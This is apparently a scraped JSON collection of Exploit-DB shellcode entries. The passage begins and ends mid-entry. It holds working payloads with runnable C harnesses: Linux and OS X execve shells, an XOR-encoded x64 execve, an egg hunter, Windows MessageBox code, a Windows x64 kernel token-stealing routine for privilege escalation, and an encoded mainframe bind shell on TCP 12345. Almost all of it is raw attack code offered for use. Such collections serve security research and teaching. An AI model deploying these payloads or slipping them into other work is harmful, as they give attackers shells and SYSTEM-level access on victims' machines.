$0x10,%ecx", "   c:\t68 90 64 6f 77       \tpush   $0x776f6490", "  11:\t5b                   \tpop    %ebx", "  12:\tc1 eb 08             \tshr    $0x8,%ebx", "  15:\t53                   \tpush   %ebx", "  16:\t68 2f 73 68 61       \tpush   $0x6168732f", "  1b:\t68 2f 65 74 63       \tpush   $0x6374652f", "  20:\t89 e3                \tmov    %esp,%ebx", "  22:\tcd 80                \tint    $0x80", "  24:\tb0 01                \tmov    $0x1,%al", "  26:\tb3 01                \tmov    $0x1,%bl", "  28:\tcd 80                \tint    $0x80", "", "*/", "", "#include <stdio.h>", "#include <string.h>", "int main(){", "unsigned char shellcode[]= \"\\x6a\\x0f\\x58\\x68\\x90\\x90\\xff\\x01\\x59\\xc1\\xe9\\x10\\x68\\x90\\x64\\x6f\\x77\\x5b\\xc1\\xeb\\x08\\x53\\x68\\x2f\\x73\\x68\\x61\\x68\\x2f\\x65\\x74\\x63\\x89\\xe3\\xcd\\x80\\xb0\\x01\\xb3\\x01\\xcd\\x80\";", "fprintf(stdout,\"Length: %d\\n\\n\",strlen(shellcode));", "    (*(void(*)()) shellcode)();", "}"]},
{"Title": "Linux/x86 - exec /bin/dash Shellcode (45 bytes)", "Author": "Mohammad Reza Espargham", "Published": ": 2015-06-26", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/37393.asm", "View": "https://old.exploit-db.com/raw/37393/", "code": ["/*", "# Title: Linux/x86 exec('/bin/dash') - shellcode 45 bytes", "# Platform: linux/x86_64", "# Date: 2015-06-15", "# Author: Mohammad Reza Espargham", "#    Linkedin    :   https://ir.linkedin.com/in/rezasp", "#    E-Mail      :   me[at]reza[dot]es , reza.espargham[at]gmail[dot]com", "#    Website     :   www.reza.es", "#    Twitter     :   https://twitter.com/rezesp", "#    FaceBook    :   https://www.facebook.com/mohammadreza.espargham", "", "", "Disassembly of section .text:", "", "00000000 <.text>:", "   0:\tb0 46                \tmov    $0x46,%al", "   2:\t31 db                \txor    %ebx,%ebx", "   4:\t31 c9                \txor    %ecx,%ecx", "   6:\tcd 80                \tint    $0x80", "   8:\t68 90 90 90 68       \tpush   $0x68909090", "   d:\t58                   \tpop    %eax", "   e:\tc1 e8 10             \tshr    $0x10,%eax", "  11:\tc1 e8 08             \tshr    $0x8,%eax", "  14:\t50                   \tpush   %eax", "  15:\t68 2f 64 61 73       \tpush   $0x7361642f", "  1a:\t68 2f 62 69 6e       \tpush   $0x6e69622f", "  1f:\t89 e3                \tmov    %esp,%ebx", "  21:\t31 c0                \txor    %eax,%eax", "  23:\tb0 0b                \tmov    $0xb,%al", "  25:\tcd 80                \tint    $0x80", "  27:\tb0 01                \tmov    $0x1,%al", "  29:\tb3 01                \tmov    $0x1,%bl", "  2b:\tcd 80                \tint    $0x80", "*/", "", "#include <stdio.h>", "#include <string.h>", "int main(){", "unsigned char shellcode[]= \"\\xb0\\x46\\x31\\xdb\\x31\\xc9\\xcd\\x80\\x68\\x90\\x90\\x90\\x68\\x58\\xc1\\xe8\\x10\\xc1\\xe8\\x08\\x50\\x68\\x2f\\x64\\x61\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc0\\xb0\\x0b\\xcd\\x80\\xb0\\x01\\xb3\\x01\\xcd\\x80\";", "fprintf(stdout,\"Length: %d\\n\\n\",strlen(shellcode));", "    (*(void(*)()) shellcode)();", "}"]},
{"Title": "Linux/x64 - execve() Encoded Shellcode (57 bytes)", "Author": "Bill Borskey", "Published": ": 2015-06-27", "Platform": "Linux_x86-64", "Download": "https://old.exploit-db.com/download/37401.asm", "View": "https://old.exploit-db.com/raw/37401/", "code": ["/*", "Compile with: gcc -fno-stack-protector -z execstack", "This execve shellcode is encoded with 0xff and is for 64 bit linux.", "", "shell:     file format elf64-x86-64", "", "", "Disassembly of section .text:", "", "0000000000400080 <start>:", "  400080:\t48 b9 ff ff ff ff ff \tmovabs rcx,0xffffffffffffffff", "  400087:\tff ff ff ", "  40008a:\t49 b8 ae b7 72 c3 db \tmovabs r8,0xfffaf0dbc372b7ae", "  400091:\tf0 fa ff ", "  400094:\t49 31 c8             \txor    r8,rcx", "  400097:\t41 50                \tpush   r8", "  400099:\t49 b8 d0 9d 96 91 d0 \tmovabs r8,0x978cd0d091969dd0", "  4000a0:\td0 8c 97 ", "  4000a3:\t49 31 c8             \txor    r8,rcx", "  4000a6:\t41 50                \tpush   r8", "  4000a8:\t49 b8 b7 ce 2d ad 4f \tmovabs r8,0x46b7c44fad2dceb7", "  4000af:\tc4 b7 46 ", "  4000b2:\t49 31 c8             \txor    r8,rcx", "  4000b5:\t41 50                \tpush   r8", "  4000b7:\tff e4                \tjmp    rsp", "", "2015 William Borskey", "", "*/", "char shellcode[] = \"\\x48\\xb9\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x49\\xb8\\xae\\xb7\\x72\\xc3\\xdb\\xf0\\xfa\\xff\\x49\\x31\\xc8\\x41\\x50\\x49\\xb8\\xd0\\x9d\\x96\\x91\\xd0\\xd0\\x8c\\x97\\x49\\x31\\xc8\\x41\\x50\\x49\\xb8\\xb7\\xce\\x2d\\xad\\x4f\\xc4\\xb7\\x46\\x49\\x31\\xc8\\x41\\x50\\xff\\xe4\";", "", "int main(int argc, char **argv)", "{", "    int (*func)();", "    func = (int (*)()) shellcode;", "    (int)(*func)();", "     return 0;", "}"]},
{"Title": "Windows/x86 (XP SP3) (Turkish) - MessageBox Shellcode (24 bytes)", "Author": "B3mB4m", "Published": ": 2015-07-21", "Platform": "Windows_x86", "Download": "https://old.exploit-db.com/download/37664.c", "View": "https://old.exploit-db.com/raw/37664/", "code": ["win32/xp[TR] sp3  MessageBox - 24Bytes", "", "#Greetz : Bomberman&T-Rex", "#Author : B3mB4m", "#Proof  : http://imgur.com/727ALiY", "", "I know there is nothing new.I wrote just to say  \"I am back\" .. ", "", "-Coming soon-", "   arwin.c [v2] ..", "   Polymorphic shellcodes .. ", "   Win7,Win8,Win10 shellcodes .. ", "   RunPE & Migrate ? !!(If bomberman allowed hehe)\t", "", "Stay tuned ! :) ", "", "", "", "Disassembly of section .text:", "", "00401000 <_start>:", "  401000:       31 c0                   xor    %eax,%eax", "  401002:       50                      push   %eax", "  401003:       68 42 34 6d 7c          push   $0x7c6d3442", "  401008:       68 7c 42 33 6d          push   $0x6d33427c", "  40100d:       89 e1                   mov    %esp,%ecx", "  40100f:       bb d4 29 86 7c          mov    $0x7c8629d4,%ebx", "  401014:       51                      push   %ecx", "  401015:       50                      push   %eax", "  401016:       ff d3                   call   %ebx", "", "", "", "#include <stdio.h>", "#include <string.h>", "", "char shellcode[] = \"\\x31\\xc0\\x50\\x68\\x42\\x34\\x6d\\x7c\\x68\\x7c\\x42\\x33\\x6d\\x89\\xe1\\xbb\\xd4\\x29\\x86\\x7c\\x51\\x50\\xff\\xd3\";", "", "int main(int argc, char **argv){", "\t", "\tint (*func)();", "\tfunc = (int (*)()) shellcode;", "\t(int)(*func)();", "}"]},
{"Title": "Linux/x86 - Egghunter (0x50905090) Without Hardcoded Signature Shellcode (19 bytes)", "Author": "Guillaume Kaddouch", "Published": ": 2015-08-10", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/37749.c", "View": "https://old.exploit-db.com/raw/37749/", "code": ["/*", "Title: Linux x86 Egg Hunter Shellcode (19 bytes)", "Date: 4 August 2015", "Author: Guillaume Kaddouch", "    Website: http://networkfilter.blogspot.com", "    Twitter: @gkweb76", "Tested on: Ubuntu 14.04.2 LTS x86, Kali Linux 1.0.9 x86", "", "This code was created as an exercise for the SecurityTube Linux Assembly Expert (SLAE).", "", "Egg signature = 0x50905090 (push eax, nop, push eax, nop)", "Usually egg hunters use a 2 * 4 bytes (8 bytes) egg because the first address check could match the hardcoded egg signature in", "the egg hunter itself. As we do not store hardcoded egg signature below, it allows us to check only 4 bytes once.", "", "egg-hunter.asm:", "----------------", "", "global _start", "", "section .text", "", "_start:", "        mov eax, addr                   ; retrieve a valid address (shorter than using JMP CALL POP)", "        mov ebx, dword 0x5090508f       ; egg signature altered: 0x50905090 - 1", "        inc ebx                         ; fix egg signature in ebx (the purpose is to not store the hardcoded egg signature)", "", "next_addr:", "        inc eax                         ; increasing memory address to look at next address", "        cmp dword [eax], ebx            ; check if our egg is at that memory address, if yes set ZF = 1", "        jne next_addr                   ; if ZF = 0 (check failed), then jump to next_addr to check next address", "        jmp eax                         ; we found our egg (ZF = 1), jump at this address", "", "        addr: db 0x1", "*/", "", "/*", "myegg.c:", "-----------", "Compile with: gcc -fno-stack-protector -z execstack myegg.c -o myegg", "*/", "", "#include<stdio.h>", "#include<string.h>", "", "// Egg hunter 19 bytes (\\x00 \\x0a \\x0d free)", "unsigned char egghunter[] = \\", "\"\\xb8\\x72\\x80\\x04\\x08\\xbb\\x8f\\x50\\x90\\x50\\x43\\x40\\x39\\x18\\x75\"", "\"\\xfb\\xff\\xe0\\x01\";", "", "// Print 'Egg Found!!' on screen", "// You can swap it out with any shellcode you like (as long as you keep the egg mark)", "unsigned char shellcode[] = \\", "\"\\x90\\x50\\x90\\x50\" // egg mark", "\"\\xeb\\x16\\x59\\x31\\xc0\\x50\\xb0\\x04\\x31\\xdb\\xb3\\x01\\x31\\xd2\\xb2\"", "\"\\x0c\\xcd\\x80\\x31\\xc0\\xb0\\x01\\xcd\\x80\\xe8\\xe5\\xff\\xff\\xff\\x45\"", "\"\\x67\\x67\\x20\\x46\\x6f\\x75\\x6e\\x64\\x21\\x21\\x0a\";", "", "main()", "{", "        printf(\"Egg hunter shellcode Length:  %d\\n\", strlen(egghunter));", "        int (*ret)() = (int(*)())egghunter;", "        ret();", "}"]},
{"Title": "Windows/x86 - user32!MessageBox(Hello World!) + Null-Free Shellcode (199 bytes)", "Author": "noviceflux", "Published": ": 2015-08-12", "Platform": "Windows_x86", "Download": "https://old.exploit-db.com/download/37758.c", "View": "https://old.exploit-db.com/raw/37758/", "code": ["/*", " * This file was automatically generated by mkhex.sh,", " * which, together with the complete", " * and heavily commented assembly source code", " * for this shellcode, is available at", " * https://github.com/NoviceLive/shellcoding.", " *", " * For those curious heads", " * striving to figure out what's under the hood.", " *", " */", "", "", "# include <stdlib.h>", "# include <stdio.h>", "# include <string.h>", "", "# include <windows.h>", "", "", "int", "main(void)", "{", "  char *shellcode = \"\\x33\\xc9\\x64\\x8b\\x49\\x30\\x8b\\x49\\x0c\\x8b\"", "    \"\\x49\\x1c\\x8b\\x59\\x08\\x8b\\x41\\x20\\x8b\\x09\"", "    \"\\x80\\x78\\x0c\\x33\\x75\\xf2\\x8b\\xeb\\x03\\x6d\"", "    \"\\x3c\\x8b\\x6d\\x78\\x03\\xeb\\x8b\\x45\\x20\\x03\"", "    \"\\xc3\\x33\\xd2\\x8b\\x34\\x90\\x03\\xf3\\x42\\x81\"", "    \"\\x3e\\x47\\x65\\x74\\x50\\x75\\xf2\\x81\\x7e\\x04\"", "    \"\\x72\\x6f\\x63\\x41\\x75\\xe9\\x8b\\x75\\x24\\x03\"", "    \"\\xf3\\x66\\x8b\\x14\\x56\\x8b\\x75\\x1c\\x03\\xf3\"", "    \"\\x8b\\x74\\x96\\xfc\\x03\\xf3\\x33\\xff\\x57\\x68\"", "    \"\\x61\\x72\\x79\\x41\\x68\\x4c\\x69\\x62\\x72\\x68\"", "    \"\\x4c\\x6f\\x61\\x64\\x54\\x53\\xff\\xd6\\x33\\xc9\"", "    \"\\x57\\x66\\xb9\\x33\\x32\\x51\\x68\\x75\\x73\\x65\"", "    \"\\x72\\x54\\xff\\xd0\\x57\\x68\\x6f\\x78\\x41\\x01\"", "    \"\\xfe\\x4c\\x24\\x03\\x68\\x61\\x67\\x65\\x42\\x68\"", "    \"\\x4d\\x65\\x73\\x73\\x54\\x50\\xff\\xd6\\x57\\x68\"", "    \"\\x72\\x6c\\x64\\x21\\x68\\x6f\\x20\\x57\\x6f\\x68\"", "    \"\\x48\\x65\\x6c\\x6c\\x8b\\xcc\\x57\\x57\\x51\\x57\"", "    \"\\xff\\xd0\\x57\\x68\\x65\\x73\\x73\\x01\\xfe\\x4c\"", "    \"\\x24\\x03\\x68\\x50\\x72\\x6f\\x63\\x68\\x45\\x78\"", "    \"\\x69\\x74\\x54\\x53\\xff\\xd6\\x57\\xff\\xd0\";", "", "  DWORD why_must_this_variable;", "  BOOL ret = VirtualProtect (shellcode, strlen(shellcode),", "    PAGE_EXECUTE_READWRITE, &why_must_this_variable);", "", "  if (!ret) {", "    printf (\"VirtualProtect\\n\");", "    return EXIT_FAILURE;", "  }", "", "  printf(\"strlen(shellcode)=%d\\n\", strlen(shellcode));", "", "  ((void (*)(void))shellcode)();", "", "  return EXIT_SUCCESS;", "}"]},
{"Title": "Windows/x64 (2003) - Token Stealing Shellcode (59 bytes)", "Author": "Fitzl Csaba", "Published": ": 2015-08-20", "Platform": "Windows_x86-64", "Download": "https://old.exploit-db.com/download/37895.asm", "View": "https://old.exploit-db.com/raw/37895/", "code": [";token stealing shellcode Win 2003 x64", ";based on the widely available x86 version", ";syntax for NASM", ";Author: Csaba Fitzl, @theevilbit", "", ";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;", ";important structures and offsets;", ";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;", "", ";kd> dt -r1 nt!_TEB", ";   +0x110 SystemReserved1  : [54] Ptr64 Void", ";??????+0x078 KTHREAD <----- NOT DOCUMENTED, can't get it from WINDBG directly", "", ";kd> dt -r1 nt!_KTHREAD", ";   +0x048 ApcState         : _KAPC_STATE", ";     +0x000 ApcListHead      : [2] _LIST_ENTRY", ";\t  +0x020 Process          : Ptr64 _KPROCESS", "", ";kd> dt -r1 nt!_EPROCESS", ";   +0x0d8 UniqueProcessId  : Ptr64 Void", ";   +0x0e0 ActiveProcessLinks : _LIST_ENTRY", ";     +0x000 Flink            : Ptr64 _LIST_ENTRY", ";     +0x008 Blink            : Ptr64 _LIST_ENTRY", ";  +0x160 Token            : _EX_FAST_REF", ";     +0x000 Object           : Ptr64 Void", ";     +0x000 RefCnt           : Pos 0, 4 Bits", ";     +0x000 Value            : Uint8B", "", "BITS 64", "", "global start", "", "section .text", "", "start:", "mov \trax, [gs:0x188] \t \t;Get current ETHREAD in", "mov \trax, [rax+0x68]   \t\t;Get current EPROCESS address", "mov \trcx, rax                ;Copy current EPROCESS address to RCX", "", "find_system_process:", "mov \trax, [rax+0xe0]   \t\t;Next EPROCESS ActiveProcessLinks.Flink", "sub\t\trax, 0xe0\t\t\t\t;Go to the beginning of the EPROCESS structure", "mov\t\tr9 , [rax+0xd8]\t\t\t;Copy PID to R9", "cmp \tr9 , 0x4    \t\t\t;Compare R9 to SYSTEM PID (=4)", "jnz short find_system_process   ;If not SYSTEM got to next EPROCESS", "", "stealing:", "mov \trdx, [rax+0x160] \t\t;Copy SYSTEM process token address to RDX", "mov \t[rcx+0x160], rdx\t\t;Steal token with overwriting our current process's token address", "retn \t0x10", "", ";byte stream:", ";\"\\x65\\x48\\x8b\\x04\\x25\\x88\\x01\\x00\\x00\\x48\\x8b\\x40\\x68\\x48\\x89\\xc1\"", ";\"\\x48\\x8b\\x80\\xe0\\x00\\x00\\x00\\x48\\x2d\\xe0\\x00\\x00\\x00\\x4c\\x8b\\x88\"", ";\"\\xd8\\x00\\x00\\x00\\x49\\x83\\xf9\\x04\\x75\\xe6\\x48\\x8b\\x90\\x60\\x01\\x00\"", ";\"\\x00\\x48\\x89\\x91\\x60\\x01\\x00\\x00\\xc2\\x10\\x00\""]},
{"Title": "OSX/x64 - execve(/bin/sh) + Null-Free Shellcode (34 bytes)", "Author": "Fitzl Csaba", "Published": ": 2015-09-02", "Platform": "OSX", "Download": "https://old.exploit-db.com/download/38065.txt", "View": "https://old.exploit-db.com/raw/38065/", "code": ["[*] Author: Csaba Fitzl, @theevilbit", "[*] Tested on OS X 10.10.5", "[*] OS X x64 /bin/sh shellcode, NULL byte free, 34 bytes", "[*] Assembly version", "[*] binsh-shellcode.asm", "[*] ./nasm -f macho64 binsh-shellcode.asm", "[*] ld -macosx_version_min 10.7.0 -o binsh-shellcode binsh-shellcode.o ", "", "-------------------------------------------------------------------------------", "BITS 64", "", "global start", "", "section .text", "", "start:", "\txor     rsi,rsi\t\t\t\t\t;zero out RSI", "\tpush    rsi\t\t\t\t\t\t;push NULL on stack", "\tmov     rdi, 0x68732f6e69622f2f\t;mov //bin/sh string to RDI (reverse)", "\tpush    rdi\t\t\t\t\t\t;push rdi to the stack", "\tmov     rdi, rsp\t\t\t\t;store RSP (points to the command string) in RDI", "\txor     rdx, rdx\t\t\t\t;zero out RDX", "\t", "\t;store syscall number on RAX", "\txor     rax,rax\t\t\t\t\t;zero out RAX", "\tmov     al,2\t\t\t\t\t;put 2 to AL -> RAX = 0x0000000000000002", "\tror     rax, 0x28\t\t\t\t;rotate the 2 -> RAX = 0x0000000002000000", "\tmov     al,0x3b\t\t\t\t\t;move 3b to AL (execve SYSCALL#) -> RAX = 0x000000000200003b", "    syscall\t\t\t\t\t\t\t;trigger syscall", "-------------------------------------------------------------------------------", "", "[*] C version", "[*] Get the hex opcodes from the object file: otool -t binsh-shellcode.o", "[*] binsh-shellcode.c", "[*] Compile: gcc binsh-shellcode.c -o sc", "[*] Run: ./sc", "", "-------------------------------------------------------------------------------", "#include <stdio.h>", "#include <sys/mman.h>", "#include <string.h>", "#include <stdlib.h>", " ", "int (*sc)();", " ", "char shellcode[] =", "\"\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x57\\x48\\x89\\xe7\\x48\\x31\\xd2\\x48\\x31\\xc0\\xb0\\x02\\x48\\xc1\\xc8\\x28\\xb0\\x3b\\x0f\\x05\";", " ", "int main(int argc, char **argv) {", " ", "    void *ptr = mmap(0, 0x22, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON", "            | MAP_PRIVATE, -1, 0);", " ", "    if (ptr == MAP_FAILED) {", "        perror(\"mmap\");", "        exit(-1);", "    }", " ", "    memcpy(ptr, shellcode, sizeof(shellcode));", "    sc = ptr;", " ", "    sc();", " ", "    return 0;", "}", "-------------------------------------------------------------------------------"]},
{"Title": "Mainframe/System Z - Bind (12345/TCP) Shell + Null-Free Shellcode (2488 bytes)", "Author": "Bigendian Smalls", "Published": ": 2015-09-02", "Platform": "System_z", "Download": "https://old.exploit-db.com/download/38075.txt", "View": "https://old.exploit-db.com/raw/38075/", "code": ["         TITLE 'sb_shellcode.s                                         x", "               Author:  Bigendian Smalls' ", "         ACONTROL AFPR                    ", "SBSHELL  CSECT                             ", "SBSHELL  AMODE 31                           ", "SBSHELL  RMODE ANY                           ", "         SYSSTATE ARCHLVL=2                   ", "         ENTRY MAIN", "MAIN     DS    0F                              ", "** Begin setup and stack management **", "         STM   6,4,12(13)     # store all the registers in old SP area", "         LARL  15,*-4         # put base addr into R15 ", "         LR    12,15          # put given base addr into R12", "         XR    1,1            # zeroout R1 for counting", "         XR    2,2            # zeroout R1 for counting", "         XR    3,3            # zeroout R3", "         AFI   1,X'01010102'  # loading a 1 in R1 ", "         AFI   2,X'01010103'  # loading a 1 in R1 ", "         XR    1,2            # loading a 1 in R1", "         LR    4,1            #  will put a 4 in R4", "         SLA   4,1(1)         # make R1 == 4", "         XR    10,10          # zeroout R10 for our egg", "         XR    2,2            # zero 2", "         LGFI  10,X'deadbeef' # load egghunter value into R10", "         LR    11,12          # load  base int R11", "LOOPER   AR    11,1           # add 1 to R11 ", "         L     3,1(2,11)      # retrieve value at R11 +1 indexR2=0", "         CR    10,3           # compare egg with R11 mem pointer ", "         BRC   7,LOOPER       # branch anything but equal", "         AR    11,4           ", "         L     3,1(2,11)      # retrieve value at R11 +1 indexR2=0", "         CR    10,3           # compare egg with R11 mem pointer ", "         BRC   7,LOOPER       # 2nd check 2 in a row good to go!", "         AR    11,1           # 1 for the offset from above", "         SR    11,4           # 4 to skip last egg", "         ST    13,4(,11)      # store old SP for later in wkg area", "         ST    11,8(,13)      # store this in old wking area", "         LR    13,11          # set up R13 pt to new wkg area", "** End setup and stack management **", "** Begin main decoding routine    **", "         LR    3,11           # This is now our egghunter loc", "         AR    3,4            # add 4 to 3", "         AR    3,4            # R3 points to SC for decoding", "         LR    5,3            # R5 points to SC for jumping to", "         SR    3,1            # R3-1 to we can XI that addr w/o nulls", "         SR    3,1            # R3-1 to we can XI that addr w/o nulls", "         LR    4,1            # R4 has static 1", "         XR    1,1            # R1 will be our byte counter", "         XR    2,2            # R2 will be address pointer", "LOOP1    AR    1,4            # add 1 to R1 byte counter", "         ARK   2,3,1          # generate new address pointer", "* put the XOR key  (enc buffer char) from below in the quotes below", "         XI    1(2),X'4b'     # xor byte with key", "* put the buffer len (num of bytes) in the next cmd in CHI 1,<here>", "         CHI   1,2088         # to yield sc len", "         BRC   4,LOOP1        # loop bwd 18 bytes if R1 < size", "         XR    4,4", "** Begin cleanup and stack management **", "         L     13,4(4,11)     # reload old SP ", "         LM    6,4,12(13)     # restore registers ", "         BCR   15,5           # jmp to sc ", "** End main decoding routine    **", "         DC    X'DEADBEEF'     #egg", "         DC    X'DEADBEEF'     #egg + old sp", "*******************************************************************", "*Number of bytes:    2088", "*Padding bytes:         0", "*Enc buffer char:  0x4b", "*ASM buffer: ", "         DC    X'dba79b478bbbb4b4b4b553448b0b4b4b48af1b9b0b4f539fecd34bX", "               4aec834b4fecae48708f144b4b48bd8f244b4b48beecae48788f144bX", "               4b48b98f244b4b48ba8fb64b4b489f8b5b4b4b4b5a533a1b3c4b4b51X", "               371b3b3b4b5137ee31cb4b1b3b3b4becbf4b424b4b4b4b4b4b4b4b4bX", "               4b4b4b4b4b4ea48f66b4b4b4b2a76c4b'", "         DC    X'fa4b350a6b4b428f164b4b4880532eecae49fe8f164b4b48f4532eX", "               ecae49e40a6b4b438f164b4b48f08b2a4b4b4b4becae49ee8f164b4bX", "               48fa8b2a4b4b4b4aecae49d68f164b4b48e28b2a4b4b4b49ecae49deX", "               0a6b4b428f164b4b48ea532eecae49c68f164b4b48d2532eecae49ccX", "               8fb64b4b48348b5b4b4b4b138b3b4b4b'", "         DC    X'4b0e8f344b4b4b1951378f344b4b4b1b8b3b4b4b4b0a8f344b4b4bX", "               0751378f344b4b4b7551378f344b4b4b0d51378f344b4b4b7151378fX", "               344b4b4b0b8b3b4b4b481a8f344b4b4b778f344b4b4b708f344b4b4bX", "               718f344b4b4b728f344b4b4b738b3b4b4b4b7c8f344b4b4b7f51378fX", "               344b4b4b795137ee31cb4b8f344b4b4b'", "         DC    X'65ec4e4b664b4b4b4b4b4c2ac9c2de2ae9c34b4b4b4b4a4b4b4b49X", "               4b4b4b4be9c34b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4bX", "               4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4bX", "               4b4b4b4b4b4b4b4b4ea4ec4e49a78bab4b4b4b400a6b4b428f164b4bX", "               4853532eecbf494feca14b5b8f164b4b'", "         DC    X'4845532eecbf4ab78fb64b4b49bd8b5b4b4b4b7e8b3b4b4b49a18fX", "               344b4b4b648b3b4b4b49a98f344b4b4b608b3b4b4b49918f344b4b4bX", "               6c8b3b4b4b499d8f344b4b4b688b3b4b4b4b538f344b4b4b548b3b4bX", "               4b4b558f344b4b4b5051378f344b4b4b525137ee31cb4b8f344b4b4bX", "               5eec4e4b5f4b4b4b4b4b4b4b4b4b4b4b'", "         DC    X'4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4ea4X", "               8fb64b4b49e48b5b4b4b4b618b3bb4b4b4ac8f344b4b4b6f8b3b4b4bX", "               4b548f344b4b4b6b8b3b4b4b49f88f344b4b4b578b3b4b4b4b508f34X", "               4b4b4b5351378f344b4b4b5d5137ee31cb4b8f344b4b4b59ec4e4b5aX", "               4b4b4b4b4b5b4b4b4b4b4b4b4b4b4b4b'", "         DC    X'4b4b4b4b4b4b4b4b4b4b4b4b4b4b4ea453b78f26b4b4b4b3a72c49X", "               1a4b358fb64b4b493b8b5b4b4b4b6a8b3bb4b4b4ed8f344b4b4b508bX", "               3b4b4b49138f344b4b4b5c8b3b4b4b4b5d8f344b4b4b5851378f344bX", "               4b4b5a5137ee31cb4b8f344b4b4b46ec4e4b474b4b4b4b4b4b4b4b4bX", "               4b4b4b4b4b4b4b4b4b4b4b4ea48fb64b'", "         DC    X'4b49088b5b4b4b4b7d8b3bb4b4b43c8f344b4b4b7b8b3b4b4b4b62X", "               8f344b4b4b678b3b4b4b4b508f344b4b4b638b3b4b4b4b548f344b4bX", "               4b6f8b3b4b4b4b688f344b4b4b6b5137ee31cb4b8f344b4b4b57ec4eX", "               4b504b4b4b4b4b4b4b4b4b4b5b494b4b4b4b4b4b4b4b4b4b4b4b4b4bX", "               4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b'", "         DC    X'4b4b4b4b4b4b4b4b4ea48bab4b4b4b470a6b4b4f8f16b4b4b4a7ecX", "               234b4cecbf4bbaeca14b598f164b4b4ab2ec234b4decbf4ba38b1bb4X", "               b4b4978b3b4b4b4b47ecae4b50ecae4a228b1b4b4b4aa5ecae4bc38bX", "               1b4b4b4aa88b3bb4b4b4a5ecae4b47ecae4ace8babb4b4b4bd8b1bb4X", "               b4b48becbf4b3d8fb64b4b4a82537c8f'", "         DC    X'a44b4b4ae48b6b4b4b4b079c4c6b4b6b4b8b6b4b4b4b759c446b4bX", "               6b4b8f144b4b4b098b5b4b4b4b748b3b4b4b4b798f344b4b4b608b3bX", "               4b4b4b638f344b4b4b7e8b3b4b4b4ad98f344b4b4b7a8b3b4b4b4b55X", "               8f344b4b4b668b3b4b4b4b698f344b4b4b628b3b4b4b4b638f344b4bX", "               4b6e5137ee31cb4b8f344b4b4b6aec4e'", "         DC    X'4b6b4b4b4b4b4b4b4b4b4b4b4b4a69696969696969696969696969X", "               6969694b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4bX", "               4b4b4b4b4b4b4b4ea48fa64b4b4a04533853b28f26b4b4b4a1a729abX", "               4b4bb5a7233b4bb4b5ec4e4a7a8fb64b4b4a1c8fa44b4b4a778b5b4bX", "               4b4b7a8b3bb4b4b4858f344b4b4b628b'", "         DC    X'3b4b4b4b6d8f344b4b4b6c8f144b4b4b698b3b4b4b4a608f344b4bX", "               4b6b8b3bb4b4b48a8f344b4b4b5751378f344b4b4b5151378f344b4bX", "               4b535137ee31cb4b8f344b4b4b5fec4e4b584b4b4b4b4b4b4b4b4b4bX", "               4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4ea48fa6X", "               4b4b4bb28f26b4b4b4bd53bda7234ba9'", "         DC    X'b4354cb58fb64b4b4a438fa44b4b4ba08b5b4b4b4b79533a503750X", "               3750378f144b4b4b6e8f344b4b4b638f644b4b4b6a51378f344b4b4bX", "               688f244b4b4b5751378f344b4b4b5551378f344b4b4b5751378f344bX", "               4b4b515137ee31cb4b8f344b4b4b5dec4e4b5e4b4b4b4b4b4b4b4b4bX", "               4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b'", "         DC    X'4b4b4b4b4b4b4b4b4b4b4b4b4b4ea48fa64b4b4be28f36b4b4b4bdX", "               a7334bd8b4354cb58fb64b4b4bf08fa44b4b4bd78b5b4b4b4b50533aX", "               8f344b4b4b5c51378f344b4b4b5e51378f344b4b4b5851378f344b4bX", "               4b5a5137ee31cb4b8f344b4b4b46ec4e4b474b4b4b4b4b4b4b4b4b4bX", "               4b4b4b4b4b4b4b4b4b4b4ea48f26b4b4'", "         DC    X'b4b2a7234b2bb4358f16b4b4b4a48f26b4b4b4a58fa64b4b4b2c4cX", "               b58b5bb4b4b5b08f06b4b4b44b8b6b4b4b4bccecc34b5ea87b5b4b4bX", "               3d8b704b4b4bb45273ec3f4b4dec234bceecbf4b45a81b6b4b4b3d8bX", "               104b4b4bb451625122527eec3fb4bc5022092b5b4b51525002ec3fb4X", "               a84cb58f06b4b4b5938b5bb4b4b586ec'", "         DC    X'c34bce8b6b4b4b4b115062a87b5b4b4b3d8b704b4b4bb45273ec3fX", "               4b4dec734b2eecbf4b425168a87b6b4b4b3d8b704b4b4bb4097b5b4bX", "               51525002ec3fb4af4cb55cb48b0b4b4b4b5b1bbb0b4b139b0b4fd3a7X", "               9b478b0b4b4b4b4c13bb0b4b4cb54b4b4b4b4b4b4b4b4b4b4b4b4b4bX", "               4b4b4b4a4b4b4b494a1878f74a1878ef'", "         DC    X'4a187c5b4a187d7d4a187d234a187d6f4a1878554a1878c14a1879X", "               074a18784d4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b49497b724b4b4bX", "               4b'", "E2ABUF   DC    X'0102039c09867f978d8e0b0c0d0e0f101112139d0a08871819928fX", "               1c1d1e1f808182838485171b88898a8b8c0506079091169394959604X", "               98999a9b14FF9e1a20a0e2e4e0e1e3e5e7f1a22e3c282b7c26e9eaebX", "               e8edeeefecdf21242a293b5e2d2fc2c4c0c1c3c5c7d1a62c255f3e3fX", "               f8c9cacbc8cdcecfcc603a2340273d22'", "         DC    X'd8616263646566676869abbbf0fdfeb1b06a6b6c6d6e6f707172aaX", "               bae6b8c6a4b57e737475767778797aa1bfd05bdeaeaca3a5b7a9a7b6X", "               bcbdbedda8af5db4d77b414243444546474849adf4f6f2f3f57d4a4bX", "               4c4d4e4f505152b9fbfcf9faff5cf7535455565758595ab2d4d6d2d3X", "               d530313233343536373839b3dbdcd9da'", "         DC    X'9f'", "******************************************************************", "         DC    X'8BADF00D'   eof marker", "         END", "", 